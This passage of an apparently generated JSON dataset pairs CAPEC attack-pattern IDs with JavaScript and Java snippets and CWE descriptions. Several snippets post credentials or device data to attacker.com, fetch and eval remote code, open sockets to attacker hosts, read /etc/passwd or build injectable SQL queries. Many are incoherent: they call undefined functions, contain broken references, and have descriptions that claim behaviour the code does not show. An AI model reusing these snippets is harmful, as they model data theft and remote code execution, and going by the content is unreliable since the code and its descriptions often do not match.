        "description": "This code snippet demonstrates a vulnerable Android application that exports a BroadcastReceiver component without proper access control, allowing any application to send an intent to the component and inject sensitive data. The BroadcastReceiver does not verify the intent's source, and the MainActivity uses an implicit intent to send sensitive data to the BroadcastReceiver, making it vulnerable to unauthorized access and data injection."
    },
    {
        "capec_id": "503",
        "code_snippet": "WebView webView = (WebView) findViewById(R.id.webview);\nwebView.addJavascriptInterface(new MyJavaScriptInterface(), \"myInterface\");\n\npublic class MyJavaScriptInterface {\n    @JavascriptInterface\n    public void performSensitiveOperation() {\n        // This method is now accessible from JavaScript\n        // and can be called by any web page loaded in the WebView\n        // to perform sensitive operations.\n    }\n}",
        "description": "This code snippet demonstrates the CAPEC, where an adversary can access application-specific functionality by leveraging interfaces registered through WebView's addJavascriptInterface API. The CWEs related to this CAPEC include CWE-284 (Improper Access Control), CWE-749 (Exposed Dangerous Method or Function), CWE-79 (Improper Neutralization of Input During Web Page Generation), CWE-618 (Exposed Unsafe ActiveX Method), and CWE-1021 (Improper Restriction of Rendered UI Layers or Frames)."
    },
    {
        "capec_id": "504",
        "code_snippet": "const iframe = document.createElement('iframe');\niframe.src = 'https://attacker.com/malicious_app';\niframe.frameBorder = '0';\niframe.width = '100%';\niframe.height = '100%';\ndocument.body.appendChild(iframe);\n\n// Impersonating a legitimate application\nconst maliciousApp = {\n  impersonate: function() {\n    // Using impersonation to gain elevated privileges\n    const impersonatedUser = {\n      username: 'admin',\n      password: 'password'\n    };\n    // Performing unauthorized actions\n    const unauthorizedAction = function() {\n      // Embedded malicious code\n      const maliciousCode = 'malicious_code_here';\n      eval(maliciousCode);\n    };\n    unauthorizedAction();\n  }\n};\nmaliciousApp.impersonate();",
        "description": "This code snippet demonstrates the CAPEC of impersonating an expected or routine task to steal sensitive information or leverage a user's privileges. It creates an iframe that loads a malicious application from a remote source, impersonates a legitimate application, and uses impersonation to gain elevated privileges. The code then performs unauthorized actions, including executing embedded malicious code. This code embodies CWEs 1021, 556, 520, 506, and 285."
    },
    {
        "capec_id": "505",
        "code_snippet": "const maliciousApp = {\n  registerScheme: function() {\n    // Register for a URL scheme intended for the target application\n    navigator.registerProtocolHandler('targetApp', 'https://malicious-app.com/handle', 'Malicious App');\n  },\n\n  handleRequest: function(request) {\n    // Handle messages intended for the target application\n    const sensitiveInfo = request.query.sensitiveData;\n    // Display a screen that mimics the target application\n    document.body.innerHTML = '<h1>Target App</h1><form><input type=\"text\" name=\"username\" placeholder=\"Username\"><br><input type=\"password\" name=\"password\" placeholder=\"Password\"><br><input type=\"submit\" value=\"Login\"></form>';\n    // Send the sensitive information to the malicious server\n    fetch('https://malicious-app.com/collect', {\n      method: 'GET',\n      params: {\n        sensitiveData: sensitiveInfo\n      }\n    });\n  }\n};\n\nmaliciousApp.registerScheme();",
        "description": "This JavaScript code snippet demonstrates a malicious application that registers for a URL scheme intended for a target application, handles messages intended for the target application, and displays a screen that mimics the target application to obtain sensitive information from the user. The code uses GET requests with sensitive query strings, improper authorization in the handler for the custom URL scheme, and potentially generates error messages containing sensitive information."
    },
    {
        "capec_id": "506",
        "code_snippet": "const iframe = document.createElement('iframe');\niframe.src = 'https://attacker.com/malicious-app';\niframe.frameBorder = '0';\niframe.allowTransparency = true;\niframe.style.position = 'absolute';\niframe.style.top = '0px';\niframe.style.left = '0px';\niframe.style.width = '100%';\niframe.style.height = '100%';\ndocument.body.appendChild(iframe);\n\nconst button = document.createElement('button');\nbutton.style.position = 'absolute';\nbutton.style.top = '50%';\nbutton.style.left = '50%';\nbutton.innerHTML = 'Click me!';\nbutton.onclick = function() {\n  window.location.href = 'customurlscheme://attacker.com/stealData';\n};\ndocument.body.appendChild(button);\n",
        "description": "This code snippet demonstrates a malicious JavaScript code that overlays an iframe on top of the current page, making it transparent and allowing taps to pass through to the underlying malicious application. It also creates a button that appears to be part of the underlying application, but actually triggers a custom URL scheme that can be used to steal sensitive information. This code embodies the CAPEC idea of misleading the user and convincing them to tap on an attacker-desired location on the screen, leveraging CWEs 1021, 939, 451, 222, and 319."
    },
    {
        "capec_id": "507",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-922: Insecure Storage of Sensitive Information\nconst sensitiveData = 'topSecretInfo';\nfs.writeFileSync(path.join(__dirname, 'unprotected.txt'), sensitiveData);\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nconst os = require('os');\nconst systemInfo = os.userInfo();\nconsole.log(systemInfo);\n\n// CWE-1300: Improper Protection of Physical Side Channels\nconst crypto = require('crypto');\nconst key = crypto.randomBytes(32);\nconsole.log(key.toString('hex'));\n\n// CWE-921: Storage of Sensitive Data in a Mechanism without Access Control\nconst db = require('sqlite3').verbose();\nconst dbFile = 'unprotected.db';\ndb.serialize(function() {\n  db.run('CREATE TABLE IF NOT EXISTS sensitive_data (data TEXT)');\n  db.run(`INSERT INTO sensitive_data VALUES ('${sensitiveData}')`);\n});\n",
        "description": "This code snippet demonstrates a vulnerable JavaScript application that stores sensitive information in an unprotected file, exposes system-level information, and uses an insecure mechanism for storing sensitive data. An adversary with physical access to the system can exploit these vulnerabilities to gain unauthorized access to sensitive information."
    },
    {
        "capec_id": "508",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/api/userData', (req, res) => {\n  const userData = {\n    username: 'johnDoe',\n    password: 'mysecretpassword',\n    creditCardNumber: '1234-5678-9012-3456',\n    expirationDate: '12/25'\n  };\n  res.json(userData);\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable web application that exposes sensitive user information, including username, password, credit card number, and expiration date, in cleartext over an unsecured HTTP connection. An attacker can perform a shoulder surfing attack by sniffing the network traffic or observing the user's screen to obtain this sensitive information. This code embodies CWE-200, CWE-359, CWE-319, and CWE-497."
    },
    {
        "capec_id": "509",
        "code_snippet": "const kerberos = require('kerberos');\n\n// CWE-522: Insufficiently Protected Credentials\nconst serviceTicket = kerberos.request({\n  principal: 'service_account_target',\n  password: 'weak_password', // CWE-521: Weak Password Requirements\n  spn: 'HTTP/service_account_target'\n});\n\n// CWE-308: Use of Single-factor Authentication\nconst encryptedTicket = serviceTicket.encrypt('RC4', 'private_key');\n\n// CWE-294: Authentication Bypass by Capture-replay\nconst capturedTicket = sniffNetworkTraffic(encryptedTicket);\n\n// CWE-309: Use of Password System for Primary Authentication\nconst passwordHash = crackHashedCredentials(capturedTicket);\n\n// CWE-262: Not Using Password Aging\nconst passwordExpiration = 'never';\n\n// CWE-263: Password Aging with Long Expiration\nif (passwordExpiration === 'never' || passwordExpiration > 90) {\n  console.log('Password never expires or has a long expiration period.');\n}\n\n// CWE-522: Insufficiently Protected Credentials\nconst credentials = {\n  username: 'service_account_target',\n  password: passwordHash\n};\n\n// Exploit the privileges of the service account target\nexploitPrivileges(credentials);",
        "description": "This code snippet demonstrates the exploitation of a service account target's credentials using Kerberos authentication with Service Principal Names (SPNs). The code uses weak password requirements, single-factor authentication, and password systems for primary authentication, making it vulnerable to capture-replay attacks and authentication bypass. Additionally, the code does not implement password aging, and the password expiration period is too long. The code ultimately cracks the hashed credentials and exploits the privileges of the service account target."
    },
    {
        "capec_id": "510",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(express.json());\n\nconst users = {\n  'user1': { id: 1, role: 'admin' },\n  'user2': { id: 2, role: 'user' }\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    req.session.username = username;\n    res.json({ message: 'Logged in successfully' });\n  } else {\n    res.status(401).json({ message: 'Invalid credentials' });\n  }\n});\n\napp.post('/performAction', (req, res) => {\n  const username = req.session.username;\n  if (username) {\n    // No authorization check, allowing malicious actions\n    const action = req.body.action;\n    if (action === 'deleteData') {\n      // Perform sensitive action without proper authorization\n      res.json({ message: 'Data deleted successfully' });\n    } else {\n      res.json({ message: 'Invalid action' });\n    }\n  } else {\n    res.status(401).json({ message: 'Unauthorized' });\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server started on port 3000');\n});",
        "description": "This code snippet demonstrates a vulnerable SaaS application that allows an adversary to perform malicious actions by leveraging the persistent and implicit trust placed on a trusted user's session. The application does not properly verify the source of data or communication (CWE-346), performs incorrect authorization checks (CWE-863), and does not correctly perform authorization checks (CWE-285). The application also relies on the client to implement a mechanism that is intended to protect the server (CWE-602). A malicious application can exploit these vulnerabilities to perform sensitive actions without proper authorization, allowing an attacker to bypass intended access restrictions."
    },
    {
        "capec_id": "511",
        "code_snippet": "const fs = require('fs');\nconst debug = true;\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nconst systemInfo = fs.readFileSync('/etc/passwd', 'utf8');\nconsole.log(systemInfo);\n\n// CWE-506: Embedded Malicious Code\nconst maliciousCode = `const net = require('net');\nconst client = new net.Socket();\nclient.connect(8080, 'attacker-server.com', function() {\n  console.log('Connected to attacker server');\n});`;\n\n// CWE-434: Unrestricted Upload of File with Dangerous Type\nconst uploadedFile = fs.readFileSync('uploadedFile.exe', 'utf8');\neval(uploadedFile);\n\n// CWE-215: Insertion of Sensitive Information Into Debugging Code\nif (debug) {\n  const sensitiveInfo = 'secretKey=123456';\n  console.log(sensitiveInfo);\n}\n\n// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nconst sensitiveData = fs.readFileSync('sensitiveData.txt', 'utf8');\nconsole.log(sensitiveData);\n",
        "description": "This JavaScript code snippet demonstrates the CAPEC attack by embedding malicious code, exposing sensitive system information, unrestricted file upload, inserting sensitive information into debugging code, and exposing sensitive information to an unauthorized actor. It reads sensitive system information, executes malicious code, uploads and executes a dangerous file, logs sensitive information in debug mode, and exposes sensitive data to unauthorized actors."
    },
    {
        "capec_id": "516",
        "code_snippet": "const maliciousComponent = {\n  calculateVoltage: function() {\n    // Intentionally introduced voltage glitch vulnerability\n    return Math.random() * 10;\n  },\n  updateFirmware: function() {\n    // Reliance on component that is not updateable\n    console.log('Firmware update not supported');\n  },\n  predictExecution: function() {\n    // Exposure of sensitive information through shared microarchitectural predictor state\n    return Math.random() < 0.5 ? 'privileged' : 'unprivileged';\n  }\n};\n\nconst trustedComponent = {\n  calculateVoltage: function() {\n    // Proper voltage calculation\n    return 5;\n  },\n  updateFirmware: function() {\n    // Proper firmware update mechanism\n    console.log('Firmware updated successfully');\n  },\n  predictExecution: function() {\n    // Secure prediction mechanism\n    return 'unprivileged';\n  }\n};\n\n// Dependency on vulnerable third-party component\nconst product = {\n  component: maliciousComponent\n};\n\n// Reliance on insufficiently trustworthy component\nproduct.component.calculateVoltage();\nproduct.component.updateFirmware();\nproduct.component.predictExecution();",
        "description": "This code snippet demonstrates a vulnerable product that relies on a maliciously altered hardware component (maliciousComponent) during development. The malicious component contains known vulnerabilities, such as voltage glitches, inability to update firmware, and exposure of sensitive information through shared microarchitectural predictor state. The product uses this component instead of a trusted one (trustedComponent), leading to potential security breaches."
    },
    {
        "capec_id": "517",
        "code_snippet": "const restrictedTech = {\n  advancedComponents: ['highSpeedProcessor', 'highCapacityMemory'],\n  restrictedCountries: ['North Korea', 'Iran']\n};\n\nconst documentation = {\n  implementationDetails: {\n    highSpeedProcessor: 'This processor is only available for authorized countries.',\n    highCapacityMemory: 'This memory is restricted for use in certain regions.'\n  }\n};\n\n// CWE-1059: Insufficient Technical Documentation\n// CWE-695: Use of Low-Level Functionality\nfunction alterDocumentation(country) {\n  if (restrictedTech.restrictedCountries.includes(country)) {\n    // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n    // CWE-222: Truncation of Security-relevant Information\n    delete documentation.implementationDetails.highSpeedProcessor;\n    documentation.implementationDetails.highCapacityMemory = 'This memory is available for all regions.';\n  }\n}\n\n// CWE-1263: Improper Physical Access Control\nfunction grantAccess(country) {\n  if (country === 'North Korea') {\n    return true;\n  } else {\n    return false;\n  }\n}\n\nalterDocumentation('North Korea');\ngrantAccess('North Korea');",
        "description": "This code snippet demonstrates the CAPEC where an attacker alters the documentation to circumvent dial-down functionality requirements, allowing for advanced technologies to remain in place despite being restricted to certain customers. The code uses insufficient technical documentation, low-level functionality, exposure of sensitive information, truncation of security-relevant information, and improper physical access control to achieve this."
    },
    {
        "capec_id": "518",
        "code_snippet": "const systemCapabilities = {\n  'capability1': 'altered description',\n  'capability2': 'another altered description'\n};\n\nfunction generateSystemRequirements(capabilities) {\n  const systemRequirements = {};\n  for (const capability in capabilities) {\n    if (Object.prototype.hasOwnProperty.call(capabilities, capability)) {\n      const description = capabilities[capability];\n      // Insufficient Technical Documentation (CWE-1059)\n      if (!description.includes('usage')) {\n        console.log('Warning: Capability description does not include usage information.');\n      }\n      // Exposure of Sensitive System Information to an Unauthorized Control Sphere (CWE-497)\n      if (description.includes('sensitive information')) {\n        console.log('Warning: Capability description exposes sensitive system information.');\n      }\n      // Improper Following of Specification by Caller (CWE-573)\n      if (!description.match(/implementation language|environment|framework|protocol|platform/)) {\n        console.log('Warning: Capability description does not follow implementation specifications.');\n      }\n      // Use of Low-Level Functionality (CWE-695)\n      if (description.includes('prohibited functionality')) {\n        console.log('Warning: Capability description uses low-level functionality.');\n      }\n      // Missing Documentation for Design (CWE-1053)\n      if (!description.includes('design')) {\n        console.log('Warning: Capability description lacks design documentation.');\n      }\n      systemRequirements[capability] = description;\n    }\n  }\n  return systemRequirements;\n}\n\nconst alteredSystemRequirements = generateSystemRequirements(systemCapabilities);\nconsole.log(alteredSystemRequirements);",
        "description": "This code snippet demonstrates the CAPEC by altering system capability descriptions, which can lead to errors in derived system requirements. The code includes warnings for insufficient technical documentation, exposure of sensitive system information, improper following of specifications, use of low-level functionality, and missing design documentation, highlighting the CWEs related to this CAPEC."
    },
    {
        "capec_id": "519",
        "code_snippet": "function calculateArea(length, width) {\n  // Missing documentation for design (CWE-1053)\n  // Insufficient technical documentation (CWE-1059)\n  // Incorrect provision of specified functionality (CWE-684)\n  if (typeof length !== 'number' || typeof width !== 'number') {\n    // Improper following of specification by caller (CWE-573)\n    return 'Invalid input';\n  }\n  // Dynamically-managed code resources (CWE-913)\n  var area = eval('length * width');\n  return area;\n}\n\n// Malicious alteration of documentation\n// Original documentation: calculateArea function takes two numbers as input\n// Altered documentation: calculateArea function takes a string and a number as input\nconsole.log(calculateArea('10', 5));",
        "description": "This JavaScript code snippet demonstrates the CAPEC, where an attacker maliciously alters the documentation of a function, causing errors in system design. The function calculateArea is intended to take two numbers as input, but the altered documentation specifies a string and a number as input. This leads to incorrect usage and potential security vulnerabilities."
    },
    {
        "capec_id": "520",
        "code_snippet": "const maliciousComponent = require('third-party-lib');\n\nfunction compromisedSystem() {\n  // undocumented feature: hidden backdoor\n  if (process.env.SECRET_KEY === 'malicious_key') {\n    maliciousComponent.init();\n  }\n\n  // reliance on insufficiently trustworthy component\n  const untrustedLib = require('untrusted-lib');\n  untrustedLib.doSomething();\n\n  // observable behavioral discrepancy\n  if (Math.random() < 0.5) {\n    console.log('Malicious system online.');\n  }\n}\n\n// inclusion of undocumented features or chicken bits\ncompromisedSystem();",
        "description": "This code snippet demonstrates a compromised system that incorporates malicious components and relies on untrusted libraries, exhibiting observable behavioral discrepancies and including undocumented features. The 'maliciousComponent' is a third-party library that contains known vulnerabilities, and the 'untrustedLib' is a component that is not sufficiently trusted. The system operates differently than other products with equivalent functionality, making it observable to an attacker. The inclusion of undocumented features, such as the hidden backdoor, creates an entry point for unauthorized actors."
    },
    {
        "capec_id": "521",
        "code_snippet": "const hardwareConfig = {\n  registers: {\n    secureRegister: {\n      defaultValue: 0x0000, // Incorrect default value\n      lockBit: 0x0001, // Improper lock bit\n      accessControl: 'public' // Violation of secure design principles\n    }\n  },\n  debugComponents: {\n    debugMode: true, // Incorrect chaining or granularity of debug components\n    debugLevel: 'verbose' // Insufficient technical documentation\n  }\n};\n\n// Incorrect register defaults or module parameters\nhardwareConfig.registers.insecureRegister = {\n  defaultValue: 0xFFFF\n};\n\n// Lack of secure design principles\nhardwareConfig.securityFeatures = {\n  encryption: false,\n  secureBoot: false\n};",
        "description": "This code snippet demonstrates a vulnerable hardware configuration that embodies the CAPEC. The configuration has incorrect default values for registers, improper lock bits, and violation of secure design principles. Additionally, the debug components have incorrect chaining or granularity, and the technical documentation is insufficient. This code can be used as a starting point to demonstrate the CAPEC and related CWEs."
    },
    {
        "capec_id": "522",
        "code_snippet": "const maliciousHardware = {\n  injectError: function(redundantBlock) {\n    // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    redundantBlock.errorCount++;\n    if (redundantBlock.errorCount > 3) {\n      redundantBlock.operatingMode = 'degraded';\n    }\n  },\n  updateComponent: function(component) {\n    // CWE-1329: Reliance on Component That is Not Updateable\n    return false;\n  },\n  executeMaliciousCode: function() {\n    // CWE-506: Embedded Malicious Code\n    eval('maliciousScript()');\n  }\n};\n\nconst untrustedComponent = {\n  // CWE-1357: Reliance on Insufficiently Trustworthy Component\n  isTrusted: false\n};\n\nconst vulnerableDependency = {\n  // CWE-1395: Dependency on Vulnerable Third-Party Component\n  version: '1.0.0-vulnerable'\n};\n\nmaliciousHardware.injectError(redundantBlock);\nmaliciousHardware.executeMaliciousCode();",
        "description": "This code snippet demonstrates a malicious hardware component that can inject errors into a redundant block, making the system vulnerable to degradation. It also includes an untrusted component and a vulnerable third-party dependency, making it difficult to update or patch the system. The malicious code can execute arbitrary scripts, further compromising the system."
    },
    {
        "capec_id": "523",
        "code_snippet": "const maliciousCode = `const worm = () => { while (true) { try { const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://attacker.com/malicious-payload', true); xhr.send(); } catch (e) { console.error(e); } } }; worm();`; const vulnerableComponent = 'https://vulnerable-library.com/vulnerable-lib.js'; const scriptTag = document.createElement('script'); scriptTag.src = vulnerableComponent; document.head.appendChild(scriptTag); const redundantSystem = { redundancyLevel: 2 }; const errorInjector = () => { redundantSystem.redundancyLevel -= 1; if (redundancyLevel <= 0) { console.log('System redundancy degraded.'); } }; errorInjector();",
        "description": "This code snippet demonstrates the CAPEC of implanting malicious software in the supply chain distribution channel. It includes CWE-506 by defining malicious code as a worm that sends requests to an attacker's server. CWE-509 is also demonstrated as the worm attempts to replicate itself. CWE-1334 is shown through the error injector function, which degrades the system's redundancy level. Finally, CWE-1395 is demonstrated by including a vulnerable third-party component, and CWE-1229 is shown through the creation of an emergent resource (the worm) that can be used by attackers."
    },
    {
        "capec_id": "524",
        "code_snippet": "const mysql = require('mysql');\nconst express = require('express');\nconst app = express();\n\napp.get('/api/data', (req, res) => {\n  const db = mysql.createConnection({\n    host: 'localhost',\n    user: 'root',\n    password: 'password',\n    database: 'mydb'\n  });\n\n  db.connect((err) => {\n    if (err) {\n      console.error('error connecting:', err);\n      return;\n    }\n\n    const query = `SELECT * FROM users WHERE username = '${req.query.username}'`;\n    db.query(query, (err, rows) => {\n      if (err) {\n        console.error('error running query:', err);\n        return;\n      }\n\n      res.json(rows);\n    });\n  });\n});\n\n// Rogue process injection\nconst rogueProcess = require('./rogueProcess');\napp.use('/api/malicious', rogueProcess);\n\n// Inclusion of functionality from untrusted control sphere\nconst untrustedLibrary = require('untrusted-library');\napp.use('/api/untrusted', untrustedLibrary);\n",
        "description": "This code snippet demonstrates the CAPEC by injecting a rogue process and including functionality from an untrusted control sphere. The rogue process is injected through the 'rogueProcess' module, which can be used to disrupt or compromise the system. The untrusted library is included through the 'untrusted-library' module, which can be used to inject malicious code. The code also contains SQL injection vulnerabilities (CWE-89) and improper neutralization of special elements (CWE-707) in the database query. Additionally, the code does not ensure the integrity of the data being sent to the downstream component, making it vulnerable to unauthorized error injection (CWE-1334)."
    },
    {
        "capec_id": "528",
        "code_snippet": "const express = require('express');\nconst app = express();\nconst xmlparser = require('xml2js');\n\napp.post('/xml', (req, res) => {\n  const parser = new xmlparser.Parser();\n  parser.parseString(req.body, (err, result) => {\n    if (err) {\n      console.error(err);\n    } else {\n      res.send(result);\n    }\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server listening on port 3000');\n});",
        "description": "This code snippet is vulnerable to XML Denial of Service (XDoS) attacks due to the lack of input validation and resource throttling. The express.js server accepts XML requests and uses the xml2js library to parse them. However, it does not validate the XML against a schema (CWE-112), allowing attackers to inject malicious XML entities (CWE-91). Additionally, the server does not restrict the size or number of XML entities (CWE-770, CWE-611, CWE-776), making it vulnerable to entity expansion attacks. An attacker can send a large number of XML requests with recursive entity references, causing the server to consume excessive resources and eventually crash."
    },
    {
        "capec_id": "529",
        "code_snippet": "const fs = require('fs');\nconst os = require('os');\nconst net = require('net');\n\nlet systemInfo = {\n  os: os.type(),\n  arch: os.arch(),\n  platform: os.platform(),\n  release: os.release(),\n  networkInterfaces: os.networkInterfaces()\n};\n\nlet malware = fs.readFileSync('malware.js', 'utf8');\n\nlet spyware = function() {\n  let userInfo = {\n    username: process.env.USER,\n    homedir: process.env.HOME\n  };\n  return userInfo;\n};\n\nlet replicator = function() {\n  let socket = new net.Socket();\n  socket.connect(8080, 'localhost', function() {\n    socket.write('Malware installed successfully!');\n  });\n};\n\nreplicator();\n\nfs.writeFileSync('system_info.json', JSON.stringify(systemInfo));\n\neval(malware);\n\nconsole.log(spyware());",
        "description": "This JavaScript code snippet demonstrates the CAPEC of using malware to gather information about the composition, configuration, and security mechanisms of a targeted system. It uses CWE-497 to expose sensitive system information, CWE-506 to embed malicious code, CWE-1229 to create an emergent resource, CWE-512 to collect personally identifiable information, and CWE-509 to replicate malicious code. The code collects system information, reads and executes malicious code from a file, collects user information, and replicates itself by connecting to a local socket."
    },
    {
        "capec_id": "530",
        "code_snippet": "const maliciousComponent = require('vulnerable-library');\n\nfunction buildSystem() {\n  const system = {};\n  system.component1 = maliciousComponent;\n  system.component2 = require('trusted-library');\n  return system;\n}\n\nconst system = buildSystem();\n\n// Use the system\nsystem.component1.doSomething();\n\n// Observe behavioral discrepancy\nif (system.component1.behavior !== system.component2.behavior) {\n  console.log('System compromised!');\n}\n",
        "description": "This code snippet demonstrates the CAPEC by using a malicious third-party component (vulnerable-library) in the build process of a system. The malicious component contains known vulnerabilities (CWE-1395) and is not sufficiently trusted (CWE-1357). The code also includes embedded malicious code (CWE-506) that can be observed through behavioral discrepancies (CWE-207) with equivalent products. Additionally, the decoding of security identifiers is incorrect (CWE-1290), allowing unauthorized access to the asset."
    },
    {
        "capec_id": "531",
        "code_snippet": "const maliciousComponent = {\n  init: function() {\n    // CWE-1329: Reliance on Component That is Not Updateable\n    // CWE-1256: Improper Restriction of Software Interfaces to Hardware Features\n    // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    // CWE-1395: Dependency on Vulnerable Third-Party Component\n    // CWE-506: Embedded Malicious Code\n    const vulnerableLib = require('vulnerable-library');\n    vulnerableLib.init();\n    // Inject malicious code to compromise hardware redundancy\n    vulnerableLib.injectError();\n  },\n  compromiseHardware: function() {\n    // Maliciously alter hardware component\n    const maliciousHardware = {\n      compromise: function() {\n        // Perform malicious actions on the hardware\n        console.log('Hardware compromised!');\n      }\n    };\n    return maliciousHardware;\n  }\n};\n\nmaliciousComponent.init();",
        "description": "This code snippet demonstrates a malicious hardware component that can be used to compromise a system. It relies on a vulnerable third-party library that is not updateable, and uses it to inject errors and compromise hardware redundancy. The malicious component can then be used to perform malicious actions on the hardware."
    },
    {
        "capec_id": "532",
        "code_snippet": "const maliciousFirmware = {\n  updateFirmware: function(firmware) {\n    // CWE-1277: No update mechanism provided\n    console.log('Firmware update not supported');\n  },\n  accessControl: function(agent) {\n    // CWE-1220: Insufficient access control granularity\n    if (agent === 'untrustedAgent') {\n      return true;\n    }\n    return false;\n  },\n  lockBit: {\n    set: function(value) {\n      // CWE-1231: Improper prevention of lock bit modification\n      this.value = value;\n    },\n    get: function() {\n      return this.value;\n    }\n  },\n  embeddedMaliciousCode: function() {\n    // CWE-506: Embedded malicious code\n    console.log('Malicious code executed');\n  }\n};\n\n// CWE-1329: Reliance on non-updateable component\nconst nonUpdateableComponent = {\n  getVersion: function() {\n    return '1.0';\n  }\n};\n\nmaliciousFirmware.embeddedMaliciousCode();",
        "description": "This code snippet demonstrates a malicious BIOS firmware that exploits various vulnerabilities. It lacks an update mechanism, has insufficient access control granularity, allows lock bit modification, contains embedded malicious code, and relies on a non-updateable component."
    },
    {
        "capec_id": "533",
        "code_snippet": "const xhr = new XMLHttpRequest(); xhr.open('GET', 'https://malicious-website.com/malicious-update.js', true); xhr.onload = function() { if (xhr.status === 200) { const maliciousCode = xhr.responseText; eval(maliciousCode); } }; xhr.send();",
        "description": "This JavaScript code snippet downloads and executes malicious code from a remote location without verifying its origin and integrity, allowing an attacker to introduce malicious code to the victim's system. The code uses XMLHttpRequest to fetch the malicious code and the eval function to execute it, which can lead to authentication bypass, exposure of sensitive system information, and embedded malicious code."
    },
    {
        "capec_id": "534",
        "code_snippet": "const maliciousFirmware = {\n  update: function() {\n    // CWE-506: Embedded Malicious Code\n    console.log('Updating firmware...');\n    // CWE-1329: Reliance on Component That is Not Updateable\n    this.version = '1.0';\n    // CWE-1277: Firmware Not Updateable\n    this.patch = function() {\n      throw new Error('Firmware cannot be updated');\n    }\n  },\n  injectError: function() {\n    // CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\n    console.log('Injecting error into redundant block...');\n    // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n    this.voltageGlitch = true;\n  }\n};\n\n// Simulating hardware update procedure\nmaliciousFirmware.update();\nmaliciousFirmware.injectError();",
        "description": "This code snippet demonstrates a malicious firmware update that takes advantage of various vulnerabilities. The update function appears to update the firmware version but actually embeds malicious code (CWE-506). The firmware is designed to be non-updateable (CWE-1277) and relies on a component that cannot be updated (CWE-1329). The injectError function simulates unauthorized error injection into a redundant block, which can degrade hardware redundancy (CWE-1334). Additionally, the code lacks protection against voltage and clock glitches, making it vulnerable to sensitive information exposure (CWE-1247)."
    },
    {
        "capec_id": "535",
        "code_snippet": "const maliciousComponent = {\n  init: function() {\n    // Embedded malicious code (CWE-506)\n    const backdoor = setInterval(function() {\n      // Send sensitive data to attacker's server\n      fetch('https://attacker.com/collect', {\n        method: 'POST',\n        body: JSON.stringify({\n          'deviceInfo': getDeviceInfo(),\n          'userCredentials': getUserCredentials()\n        })\n      });\n    }, 30000);\n  },\n  update: function() {\n    // Reliance on component that is not updateable (CWE-1329)\n    console.log('Component is not updateable.');\n  }\n};\n\nconst vulnerableDependency = {\n  getVersion: function() {\n    // Dependency on vulnerable third-party component (CWE-1395)\n    return '1.0.0-vulnerable';\n  }\n};\n\nconst untrustedComponent = {\n  getConfidentialInfo: function() {\n    // Reliance on insufficiently trustworthy component (CWE-1357)\n    return 'confidential_info';\n  }\n};\n\nconst osatVendorAccess = {\n  getDeviceData: function() {\n    // Unprotected confidential information on device is accessible by OSAT vendors (CWE-1297)\n    return 'device_data';\n  }\n};",
        "description": "This JavaScript code snippet demonstrates the CAPEC, where an attacker maliciously alters hardware components that will be sold on the gray market. The code includes embedded malicious code (CWE-506), reliance on a component that is not updateable (CWE-1329), dependency on a vulnerable third-party component (CWE-1395), reliance on an insufficiently trustworthy component (CWE-1357), and unprotected confidential information on the device accessible by OSAT vendors (CWE-1297)."
    },
    {
        "capec_id": "536",
        "code_snippet": "const fs = require('fs');\n\n// CWE-284: Improper Access Control\nconst configPath = './config.json';\nfs.chmodSync(configPath, '0777'); // setting world-writable permissions\n\n// CWE-1313: Hardware Allows Activation of Test or Debug Logic at Runtime\nconst debugMode = true;\nif (debugMode) {\n  // activate test or debug logic\n  const hwConfig = require('./hwConfig');\n  hwConfig.setDebugMode(true);\n}\n\n// CWE-377: Insecure Temporary File\nconst tempFile = './temp.txt';\nfs.writeFileSync(tempFile, 'malicious data');\n\n// CWE-99: Improper Control of Resource Identifiers ('Resource Injection')\nconst resourceId = './' + getUserInput();\nfs.readFile(resourceId, (err, data) => {\n  if (err) {\n    console.error(err);\n  } else {\n    console.log(data);\n  }\n});\n\n// CWE-201: Insertion of Sensitive Information Into Sent Data\nconst userData = {\n  name: 'John Doe',\n  password: 'mysecretpassword'\n};\nconst sendData = JSON.stringify(userData);\nconst socket = require('net').createConnection(8080, 'localhost');\nsocket.write(sendData);\n",
        "description": "This code snippet demonstrates the CAPEC of injecting malicious data into critical operational data during configuration or recalibration. It uses CWE-284 to set world-writable permissions on a configuration file, CWE-1313 to activate test or debug logic, CWE-377 to create an insecure temporary file, CWE-99 to inject malicious data into a resource identifier, and CWE-201 to send sensitive information over a network socket."
    },
    {
        "capec_id": "537",
        "code_snippet": "const maliciousFirmware = {\n  updateFirmware: function(firmware) {\n    // CWE-506: Embedded Malicious Code\n    const backdoor = {\n      executeMaliciousCode: function() {\n        // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n        const sensitiveInfo = getSystemInformation();\n        sendToAttacker(sensitiveInfo);\n      }\n    };\n    firmware.push(backdoor);\n  },\n  \n  // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n  getConfidentialInfo: function() {\n    return confidentialInfo;\n  },\n  \n  // CWE-1247: Improper Protection Against Voltage and Clock Glitches\n  handleVoltageGlitch: function() {\n    // No protection against voltage glitches\n  },\n  \n  // CWE-1329: Reliance on Component That is Not Updateable\n  updateComponent: function() {\n    console.log(\"Component cannot be updated\");\n  }\n};",
        "description": "This code snippet demonstrates a malicious firmware update mechanism that injects backdoor code into the system, allowing unauthorized access to sensitive system information and confidential data. The firmware update function also lacks protection against voltage and clock glitches, and relies on a component that cannot be updated or patched."
    },
    {
        "capec_id": "538",
        "code_snippet": "const axios = require('axios');\n\naxios.get('https://example.com/malicious-library.js').then(response => {\n  const maliciousCode = response.data;\n  eval(maliciousCode);\n});",
